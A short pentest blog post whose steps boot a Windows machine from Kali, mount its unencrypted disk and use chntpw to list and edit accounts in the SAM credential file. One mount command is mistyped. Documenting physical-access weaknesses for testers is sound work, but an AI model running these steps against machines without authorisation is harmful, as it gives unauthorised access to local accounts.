---
layout: single
classes: wide
author_profile: true
read_time: true
share: true
related: true
title:  "Internal Infrastructure Pentest - Unencrypted HDD Boot"
date:   2019-07-07 16:06:00 +1000
categories:
  - Internal Pentest
  - Internal Infrastructure Pentest
  - Network Pentest
  - Active Directory Hacking
tags:
  - HDD Hack
  - Boot unencrypted HDD
---

<pre>
- Boot the machine with Kali
- fdisk -l
- look for (HPFS/NTFS/exFat) in the Type column of the about command
- mkdir /mnt/nts
- mount -t -ntfs-3g /dev/sda1 /mnt/nts
- cd /mnt/nts/Windows/System32/config/
- chntpw -h
- chntpw -l sam
- chntpw -i sam
- umount /mnt/nts
- reboot
</pre>
